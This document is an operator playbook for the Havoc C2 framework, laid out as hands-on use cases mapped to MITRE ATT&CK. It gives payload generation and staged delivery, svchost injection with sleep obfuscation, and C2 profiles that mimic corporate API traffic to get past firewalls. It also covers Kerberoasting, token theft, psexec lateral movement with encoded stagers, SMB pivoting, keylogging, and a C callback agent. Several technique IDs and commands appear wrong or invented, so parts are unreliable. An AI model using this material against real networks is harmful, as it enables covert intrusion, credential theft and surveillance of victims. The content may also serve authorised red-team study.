# Havoc C2 — Hands-On Use Cases

## Initial Foothold via HTTP Listener

**MITRE ATT&CK:** T1071.001 (Application Layer Protocol: HTTP), T1105 (Ingress Tool Transfer), T1059 (Command and Scripting Interpreter — via Demon execute command)

**Scenario:** Operator has embedded a Havoc Demon payload in a spear-phishing email attachment or hosted it on a malicious web server. Target downloads and executes the binary. Demon establishes a reverse HTTP callback to the Team Server's listener.

**Team Server setup (via Client console):**

```bash
# Operator starts Team Server with default or custom YAOTL profile
$ sudo ./teamserver server --profile profiles/havoc.yaotl --verbose

# In the Client GUI, create a new HTTP listener job:
# 1. Navigate to "Listeners" tab
# 2. Click "New Listener" → select "HTTP"
# 3. Configure:
#    - Port: 80 (or 443 for HTTPS with cert/key path)
#    - User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
#    - Headers: Host: example.com | Connection: Keep-Alive
#    - URI path: /api/update (or any custom path per YAOTL profile)
#    - Response body: (encoded Demon response, auto-populated per profile)
# 4. Click "Start Listener"
```

**Generate Demon payload (via Client GUI):**

```
# In Client console:
1. Navigate to "Generate" menu
2. Select:
   - Listener: HTTP (the one just created)
   - Format: exe (or shellcode/dll)
   - Architecture: x64 (or x86)
   - Name: demon-payload (for tracking in session list)
3. Click "Generate"
4. Binary saved to Client's default folder (e.g., ~/Havoc/builds/)
5. Transfer to target via email, USB, web server, etc.
```

**Target execution:**

```powershell
# On target machine (Windows):
C:\Users\attacker> demon-payload.exe
# (Demon starts, sleeps for 2s [default from profile], dials HTTP listener)
```

**Operator receives callback:**

```
# In Client console, "Sessions" tab:
[+] New session: demon-2d9f1a42
    Hostname: CORP-WKS-001
    Username: corp\analyst
    Process: demon-payload.exe (PID 4024)
    Architecture: x64
    Integrity: Medium
    
# Operator can now issue commands:
Client > sleep 5
[+] Session queued: sleep 5s
[+] Next check-in: 5s ± jitter

Client > ls C:\Users\analyst\Documents
[+] Task queued
# (Result received on next check-in)
```

---

## Staged Payload Delivery

**MITRE ATT&CK:** T1071.001 (Application Layer Protocol), T1105 (Ingress Tool Transfer), T1082 (System Information Discovery — Demon probes before loading)

**Scenario:** Operator wants to minimize initial payload size (e.g., email attachment size limit). Generates a small stager that connects to Team Server, downloads the full Demon agent into memory, and executes it. No full binary ever touches the target's disk.

**Setup (via Client console):**

```
1. Create HTTP listener (same as above)
2. In "Generate" menu:
   - Select "Stager" (instead of direct exe/shellcode/dll)
   - Configure stager:
     - Size: ~10-50 KB (auto, configurable in advanced options)
     - Delivery method: exe (stager is a stub)
   - Click "Generate"
3. Stager binary saved; operator transfers to target
4. (Separately, generate full Demon payload, or use default)
```

**Target execution (stager on disk, Demon in memory only):**

```powershell
C:\Users\attacker> stager.exe
# Stager executes, connects to Team Server's HTTP listener:
#   GET /api/update HTTP/1.1
#   Host: example.com
#   (Per profile's User-Agent and headers)
# Team Server responds with full Demon agent (shellcode/DLL format in HTTP response)
# Stager decodes/decompresses, reflectively loads Demon into memory
# Demon establishes session callback

# Full Demon binary never written to C:\, only in RAM
```

**Operator receives session (same as above):**

```
Client > sessions
[+] New session: demon-4f8b2c91 (via stager)
    ...
```

---

## Multi-Agent Coordination Across Targets

**MITRE ATT&CK:** T1071.001 (Application Layer Protocol), T1210 (Exploitation of Remote Services — if lateral movement is involved)

**Scenario:** Operator has compromised 5 machines in the target network. Generates 5 Demon agents with **different sleep intervals and jitter** to avoid synchronous check-in patterns (reduces network-traffic signature), deploys all 5, and manages them from a single Client console.

**Generate multiple payloads:**

```
# In Client console, "Generate" menu (repeat for each target):

# Agent 1 (high-interaction compromised machine):
- Name: demon-fast-sales-wks
- Format: exe
- Architecture: x64
- Sleep interval: 2s, jitter: 10% (wants near-interactive commands)

# Agent 2 (admin workstation, needs stealth):
- Name: demon-admin-pc
- Sleep interval: 15s, jitter: 30% (slower, more jitter for OPSEC)

# Agent 3 (server, less monitoring):
- Name: demon-app-server
- Sleep interval: 30s, jitter: 15%

# Agent 4 (file server, critical):
- Name: demon-file-srv
- Sleep interval: 60s, jitter: 45% (very slow to avoid detection)

# Agent 5 (DC, must be silent):
- Name: demon-dc
- Sleep interval: 300s [5 min], jitter: 60% (ultra-quiet)

# Each binary carries different sleep config embedded (from profile's Demon block)
```

**Deploy and manage all 5 simultaneously:**

```
# Once all agents check in:
Client > sessions
[+] Sessions: 5 active
    demon-fast-sales-wks (sleep: 2s ±10%)
    demon-admin-pc (sleep: 15s ±30%)
    demon-app-server (sleep: 30s ±15%)
    demon-file-srv (sleep: 60s ±45%)
    demon-dc (sleep: 300s ±60%)

# Issue a command to all sessions:
Client > broadcast "whoami"
[+] Task queued to 5 sessions

# Or target specific sessions:
Client > demon-dc > ipconfig /all
[+] Task queued to demon-dc
[+] Result received on next check-in (within 300s + 60s jitter = up to 360s)
```

---

## Process Injection and OPSEC Hardening

**MITRE ATT&CK:** T1055 (Process Injection), T0801 (Defense Evasion), T1036 (Masquerading — injecting into legitimate process)

**Scenario:** Operator wants to hide Demon's memory footprint during sleep periods and inject into a legitimate process to avoid Demon binary landing on disk. Uses custom YAOTL profile with Ekko obfuscation and modified `Spawn64` target.

**YAOTL profile customization:**

```yaml
Demon {
    Sleep = 2
    Jitter = 15

    # Select sleep-obfuscation strategy:
    # Options: "ekko", "ziliean", "foliage" (default: none)
    Obfuscation = "ekko"

    Injection {
        # Process Demon injects into (instead of default notepad.exe)
        # Custom process = harder to detect via Process.GetParent()
        Spawn64 = "C:\\Windows\\System32\\svchost.exe"
        Spawn32 = "C:\\Windows\\SysWOW64\\svchost.exe"
    }
}

Listeners "default" {
    Port = 8080
    # ... (rest of HTTP profile)
}
```

**Rebuild Team Server with modified profile:**

```bash
$ sudo ./teamserver server --profile profiles/custom-opsec.yaotl --verbose
```

**Generate Demon with embedded OPSEC config:**

```
# Client console:
Client > generate --format exe --arch x64
[+] Compiling Demon with profile: custom-opsec.yaotl
[+] Embedding config: svchost.exe injection, Ekko obfuscation
[+] Binary: demon-hardened.exe (slightly larger due to Ekko stub)
```

**Target execution:**

```powershell
C:\Users\attacker> demon-hardened.exe
# Demon starts, spawns svchost.exe, injects itself into svchost
# During sleep:
#   - Ekko: Demon's .text section encrypted in-place, re-encrypted on wake-up
#   - Memory scanners see only encrypted blob, not recognizable code
#   - Behavioral signature: exception handler fire during wake-up (less common)
```

**Operator observes:**

```
Client > sessions
[+] Session: demon-hardened
    Hostname: CORP-WKS-002
    Process: svchost.exe (PID 1820)  ← Injected, not native Demon.exe
    Integrity: Medium
    Sleep obfuscation: Ekko (memory encrypted during idle)
```

---

## Custom C2 Profile for Network Isolation

**MITRE ATT&CK:** T1071.001 (Application Layer Protocol — malleable variant), T1036.005 (Match Legitimate External Traffic Pattern)

**Scenario:** Target network's perimeter proxy/firewall allows only specific HTTP traffic patterns (User-Agent whitelist, specific URIs, required headers). Operator crafts custom YAOTL profile to match legitimate internal API traffic, bypassing firewall rules.

**Environment reconnaissance:**

```
Operator observes legitimate internal traffic:
- User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
- URIs: /api/inventory, /api/status, /health
- Required headers: X-Corporate-ID: ABC123, Connection: Keep-Alive
- Response format: JSON {"status":"ok"}
```

**Custom YAOTL profile:**

```yaml
Listeners "api-mimic" {
    Port = 8080
    
    UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    
    Header {
        Name = "X-Corporate-ID"
        Value = "ABC123"
    }
    Header {
        Name = "Connection"
        Value = "Keep-Alive"
    }
    
    # Demon check-in URIs (randomly rotated):
    uripath = "/api/inventory", "/api/status", "/health"
    
    # Response template (JSON, not binary):
    Response = "{\"status\":\"ok\",\"version\":\"1.2.3\"}"
}
```

**Deploy and test:**

```bash
$ sudo ./teamserver server --profile profiles/api-mimic.yaotl --verbose
# Team Server listens on port 8080 with custom listener
```

**Generate Demon with custom profile:**

```
Client > generate --format exe --arch x64
[+] Demon compiled with api-mimic profile
[+] Demon's HTTP callbacks will use custom User-Agent, URIs, headers
```

**Target execution:**

```powershell
C:\Users\attacker> demon-api-mimic.exe
# Demon's HTTP callback:
#   GET /api/inventory HTTP/1.1
#   Host: 192.168.1.100:8080
#   User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
#   X-Corporate-ID: ABC123
#   Connection: Keep-Alive
#
# Firewall sees: looks like internal API traffic, allows it through
# Server responds: {"status":"ok","version":"1.2.3"}
# Demon decodes embedded command/task from JSON response
```

---

## Execute-Assembly for .NET Post-Exploitation

**MITRE ATT&CK:** T1059.003 (Command and Scripting Interpreter: PowerShell), T1106 (Execution via API — .NET reflection), T1057 (Process Discovery — via SharpUp), T1518 (Software Discovery — via Seatbelt)

**Scenario:** Operator has compromised a Windows machine and wants to run post-exploitation tooling (SharpUp for privesc checking, Seatbelt for system enumeration, Rubeus for Kerberos abuse). Demon's `execute-assembly` runs .NET assemblies in-memory without dropping binaries to disk.

**Operator prepares assemblies:**

```powershell
# Operator builds or obtains pre-compiled .NET assemblies:
# - SharpUp.exe (privilege escalation enumeration)
# - Seatbelt.exe (system enumeration)
# - Rubeus.exe (Kerberos abuse toolkit)

# Transfer these binaries to operator's workstation (not to target yet)
```

**Execute SharpUp via Demon:**

```
Client > select demon-2d9f1a42

# Load and run SharpUp in-memory:
Client > execute-assembly SharpUp.exe

[+] Task queued: execute-assembly SharpUp.exe
# Demon's execute-assembly handler:
# 1. Reads SharpUp.exe from operator's connection stream
# 2. Spawns sacrificial process (notepad.exe or custom per Spawn64)
# 3. Injects .NET CLR into sacrificial process
# 4. Loads SharpUp.exe assembly via reflection (Assembly.Load)
# 5. Invokes Main() entry point
# 6. Captures stdout, returns to Team Server
```

**Operator receives results:**

```
[+] Task result: SharpUp.exe
[+] ===== SharpUp 1.0 by GhostPack =====
    
    [*] Checking for unquoted service paths...
    [!] Service 'VulnService' has unquoted path: C:\Program Files\Vuln App\service.exe
        (Privilege escalation vector: writeable C:\Program Files\Vuln App)
    
    [*] Checking for weak service permissions...
    [!] Service 'BackupService' has weak permissions (Modify: Everyone)
    
    [*] Checking for scheduled tasks...
    [+] Task 'DailyBackup' runs as SYSTEM every 6:00 AM
```

**Execute Rubeus for Kerberos abuse:**

```
Client > execute-assembly Rubeus.exe kerberoast /creduser:corp\analyst /credpassword:password123

[+] Kerberoasting results:
[+] $krb5tgs$23$*user$corp.local$svc_account$*...
```

---

## Token Theft and Lateral Movement

**MITRE ATT&CK:** T1528 (Steal or Forge Kerberos Tickets), T1134 (Access Token Manipulation), T1021.002 (Remote Service Session Initiation — SMB/WMI), T1570 (Lateral Tool Transfer)

**Scenario:** Operator has low-privilege session on Demon. Uses built-in token commands to steal a high-privilege user's token (e.g., from a logged-in admin), then performs lateral movement to another host using the stolen credentials.

**Steal token from logged-in admin:**

```
Client > select demon-2d9f1a42 (low-privilege session)

Client > token steal 5820
# Assumes admin's process (e.g., explorer.exe, PID 5820) is running
# Demon impersonates admin's token

[+] Token stolen: corp\administrator (SID: S-1-5-21-...-500)
[+] Integrity level: High (SYSTEM-equivalent)
```

**Use stolen token for lateral movement:**

```
Client > execute-assembly PsExec.exe \\CORP-SRV-001 "cmd.exe /c whoami"
# OR use Demon's built-in psexec:
Client > psexec \\CORP-SRV-001 cmd.exe /c "ipconfig /all"

[+] Executing on remote host via stolen token
[+] Output:
    corp\administrator
    (Lateral movement successful; command runs as admin on CORP-SRV-001)

# Operator then deploys a second Demon to CORP-SRV-001 via same channel
Client > psexec \\CORP-SRV-001 "cmd.exe /c powershell -enc <base64-demon-stager>"

[+] New session: demon-5f7a3c11 (CORP-SRV-001)
```

---

## Peer-to-Peer SMB Pivoting

**MITRE ATT&ACK:** T1570 (Lateral Tool Transfer), T1021.002 (Remote Service Session Initiation), T1090.002 (Proxy: External Proxy)

**Scenario:** First compromised host (Demon A) can reach Team Server directly over HTTP(S). Second target host (Demon B) is isolated behind a firewall with no direct egress. Demon A relays Demon B's traffic to Team Server via SMB named pipes, enabling C2 for Demon B without direct network access.

**Initial setup (Demon A has direct egress):**

```
Client > select demon-2d9f1a42 (on network-adjacent host)

Client > pivots named-pipe
[+] SMB named-pipe pivot listener started on 192.168.1.100
[+] Waiting for peer Demon to connect via \\192.168.1.100\IPC$\...
```

**Deploy Demon B with SMB pivot configuration:**

```
# YAOTL profile for Demon B (isolated target):
Demon {
    Sleep = 2
    Jitter = 15
    
    # No HTTP/HTTPS C2; instead, SMB pivot to Demon A:
    # C2_Endpoint = "smb://192.168.1.100/IPC$"
    # (This is configured in profile or at generation time)
}

# Generate Demon B:
Client > generate --format exe --arch x64 --c2 smb://192.168.1.100

[+] Demon compiled with SMB pivot (no direct HTTP egress)
```

**Demon B execution (on isolated target):**

```powershell
C:\Users\attacker> demon-smb-pivot.exe
# Demon B dials: \\192.168.1.100\IPC$
# Connects to Demon A's SMB pivot listener
# Demon A relays Demon B's traffic to Team Server (HTTP)
```

**Operator manages both sessions:**

```
Client > sessions
[+] Session: demon-2d9f1a42 (direct HTTP callback)
    Hostname: CORP-WKS-001
    Network: Direct egress to Team Server
    
[+] Session: demon-5f7a3c11 (SMB pivot via demon-2d9f1a42)
    Hostname: CORP-ISOLATED-SRV (isolated behind firewall)
    Network: SMB tunnel → Demon A → Team Server

# Commands to isolated Demon B are relayed through Demon A:
Client > select demon-5f7a3c11
Client > ls C:\
# [Results routed: Isolated host → SMB pipe → Demon A → HTTP → Team Server → Client]
```

---

## External C2 Integration

**MITRE ATT&CK:** T1071.001 (Application Layer Protocol), T1008 (Fallback Channels), T1090.002 (Proxy: External Proxy)

**Scenario:** Operator wants to integrate Havoc Demon agents into an existing Cobalt Strike/Metasploit infrastructure or relay through a third-party C2 framework. Havoc's External C2 socket allows Demon to connect to a relay server that bridges traffic to Team Server or another C2 backend.

**Configure External C2 in YAOTL profile:**

```yaml
Service {
    Endpoint = "192.168.1.200:9999"  # External C2 relay server
    Password = "external-relay-key"
}

# Demon generated with External C2 enabled will connect to
# 192.168.1.200:9999 instead of direct HTTP(S) listener
```

**External C2 relay (operator runs separate relay server):**

```bash
$ ./external-c2-relay.py --listen 192.168.1.200:9999 --teamserver 192.168.1.100:40056

# Relay receives Demon connections on 9999, forwards to Team Server on 40056
# Demon traffic is translated between protocols (e.g., raw socket → HTTP)
```

**Demon execution (with External C2):**

```powershell
C:\Users\attacker> demon-external-c2.exe
# Dials 192.168.1.200:9999 (External C2 relay)
# Relay translates to Team Server protocol
# Session appears in Client console as normal Demon session
```

---

## Custom Agent Development

**MITRE ATT&CK:** T1071.001 (Application Layer Protocol), T1105 (Ingress Tool Transfer — custom agent binary)

**Scenario:** Operator wants to extend Havoc with a Linux or macOS agent (not just Windows Demon). Uses Havoc's **Talon framework** (custom agent support) or **Python API** (`havoc-py`) to integrate a custom agent written in a different language.

**Custom agent example (Linux, written in C):**

```c
// custom-agent.c
// Linux agent using Havoc's protocol/config format

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>

int main() {
    // Connect to Havoc Team Server on embedded C2 endpoint
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in server;
    server.sin_family = AF_INET;
    server.sin_port = htons(8080);  // From profile
    inet_pton(AF_INET, "192.168.1.100", &server.sin_addr);
    
    if (connect(sock, (struct sockaddr *)&server, sizeof(server)) < 0) {
        perror("Connection failed");
        return 1;
    }
    
    // Perform Havoc handshake (TLS/mTLS or custom per profile)
    // Send initial beacon: hostname, username, architecture, etc.
    char beacon[] = "LINUX_AGENT|hostname|username|x86_64";
    send(sock, beacon, strlen(beacon), 0);
    
    // Wait for tasks, execute, send results
    while (1) {
        char buffer[4096];
        int n = recv(sock, buffer, sizeof(buffer), 0);
        if (n <= 0) break;
        
        // Parse task, execute, send result
        // (Implementation details omitted)
        sleep(2);  // Check-in interval
    }
    
    close(sock);
    return 0;
}
```

**Integrate custom agent into Havoc:**

```bash
# Option 1: Talon framework (if using Havoc's Talon agent)
$ ./talon build --agent custom-agent.c --teamserver 192.168.1.100:40056

# Option 2: Python API (havoc-py)
$ pip install havoc-py

# In operator's Python script:
from havoc import Havoc

client = Havoc()
client.connect('192.168.1.100', 40056, 'operator', 'password')

# Generate custom agent dynamically
agent = client.generate_custom_agent(
    agent_type='linux',
    format='elf',
    arch='x64',
    c2_endpoint='192.168.1.100:8080'
)
client.deploy(agent)
```

**Custom agent execution on Linux target:**

```bash
attacker@linux-target:~$ ./custom-agent
# Agent connects to Havoc Team Server
# Appears as new session in Client console

Client > sessions
[+] Session: custom-linux-agent-7a2c4f
    Hostname: linux-target
    OS: Linux
    Architecture: x86_64
    Agent type: Custom (Linux C)
```

---

## Modular Post-Exploitation

**MITRE ATT&CK:** T1059 (Command and Scripting Interpreter), T1113 (Screen Capture), T1111 (Input Capture), T1113 (Clipboard Data), T1041 (Exfiltration Over C2 Channel)

**Scenario:** Operator wants to load additional post-exploitation modules into Demon (keylogging, screen capture, network sniffing) without rebuilding the agent. Havoc's module system (Armory or direct DLL loading) lets operators dynamically load DLLs into a running Demon session.

**List available modules:**

```
Client > modules list
[+] Available modules:
    - keylogger.dll (input capture)
    - screencap.dll (screen capture)
    - network-sniffer.dll (network traffic sniffing)
    - clipboard-monitor.dll (clipboard monitoring)
```

**Load keylogger module:**

```
Client > select demon-2d9f1a42

Client > modules load keylogger.dll
[+] Module queued: keylogger.dll
[+] Demon will load and execute module on next check-in

# Module executes in Demon's process:
# - Installs low-level keyboard hook
# - Captures keystrokes in real-time
# - Buffers to shared memory or encrypts locally
```

**Retrieve keylog results:**

```
Client > modules results keylogger
[+] Keylog output (last 1 hour):
    [CORP\analyst] [2:15 PM] password123
    [CORP\analyst] [2:16 PM] C:\Users\analyst\Documents\confidential.txt
    [CORP\analyst] [2:17 PM] SELECT * FROM customers
    ...
```

**Load screen capture module:**

```
Client > modules load screencap.dll --interval 30
[+] Screen capture module loaded
[+] Captures screenshot every 30 seconds

Client > modules results screencap --last 10
[+] Screenshot 1 (2:15 PM): [saved to ~/Havoc/screenshots/demon-2d9f1a42_001.png]
[+] Screenshot 2 (2:15:30 PM): [saved to ~/Havoc/screenshots/demon-2d9f1a42_002.png]
    ...
```

---

## Operator-Credential Management and Multi-User Sessions

**MITRE ATT&CK:** T1133 (External Remote Services — team server access control)

**Scenario:** Red team has 3 operators (Alice, Bob, Charlie) who need to share control of the same Havoc Team Server and agent sessions. Operator creates separate operator accounts in the YAOTL profile, generates per-operator credentials, and manages role-based access and audit logs.

**YAOTL profile with multiple operators:**

```yaml
Operators {
    user "alice" {
        Password = "alice-secure-password-here"
    }

    user "bob" {
        Password = "bob-secure-password-here"
    }

    user "charlie" {
        Password = "charlie-secure-password-here"
    }
}
```

**Generate per-operator credentials:**

```bash
$ ./teamserver operator --name alice --lhost 192.168.1.100 --lport 40056 --save alice.cfg
[+] Operator config: alice.cfg (contains Alice's client certificate)

$ ./teamserver operator --name bob --lhost 192.168.1.100 --lport 40056 --save bob.cfg
$ ./teamserver operator --name charlie --lhost 192.168.1.100 --lport 40056 --save charlie.cfg
```

**Each operator connects with their own credentials:**

```
# On Alice's workstation:
$ ./havoc --config alice.cfg
[+] Connecting to Team Server 192.168.1.100:40056 as alice
[+] Authentication successful

# On Bob's workstation:
$ ./havoc --config bob.cfg
[+] Connecting to Team Server 192.168.1.100:40056 as bob
[+] Authentication successful

# On Charlie's workstation:
$ ./havoc --config charlie.cfg
[+] Connected as charlie
```

**Multi-operator session management:**

```
# All 3 operators can view and control the same sessions:
Alice > sessions
[+] Sessions: 5 active
    - demon-fast-sales-wks (controlled by alice)
    - demon-admin-pc (last command by bob, 2 minutes ago)
    - demon-app-server (idle)
    - demon-file-srv (last command by charlie, 5 minutes ago)
    - demon-dc (idle, charlie is monitoring)

# Audit log (stored on Team Server):
[2:10 PM alice] generate demon-fast-sales-wks
[2:12 PM bob] execute-assembly SharpUp.exe (on demon-admin-pc)
[2:14 PM charlie] token steal 5820 (on demon-file-srv)
[2:16 PM alice] psexec \\CORP-SRV-001 cmd.exe
```

**Example multi-operator coordination:**

```
# Alice issues a command on one agent:
Alice > select demon-admin-pc
Alice > execute-assembly Rubeus.exe kerberoast

# Bob monitors a different agent:
Bob > select demon-dc
Bob > lsadump (or execute-assembly secretsdump equivalent)

# Charlie manages lateral movement:
Charlie > select demon-file-srv
Charlie > psexec \\CORP-SRV-002 cmd.exe /c "powershell -enc <stager>"

# All results funnel into the same Team Server database,
# visible to all 3 operators in real-time (or on next refresh)
```
